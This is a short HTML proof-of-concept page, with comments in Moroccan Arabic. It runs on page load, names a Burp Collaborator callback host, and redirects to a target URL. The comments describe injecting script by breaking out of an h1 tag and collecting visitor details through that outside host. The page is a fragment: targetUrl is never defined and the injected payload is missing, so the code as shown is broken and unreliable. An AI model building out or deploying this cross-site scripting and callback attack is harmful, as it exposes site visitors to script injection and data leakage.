<!DOCTYPE html>
<html>
<body onload="launchPoC()">
    <script>
        function launchPoC() {
            // الرابط ديالك فـ Burp Collaborator
            var collab = "ji5t6qi3ejqblsp8s25bm3uuul0co7cw.oastify.com";

            // هادا هو الكود اللي بغيتي ينفذ الـ IP Audit
            // استعملنا navigator.userAgent حيت هو اللي كيبين الـ IP فـ السيرفر ديال Burp

            // استعملنا </h1 ><script > باش نحقنو الكود مباشرة فـ الصفحة

            // التوجيه التلقائي
            window.location.href = targetUrl;
        }
    </script>
</body>
</html>
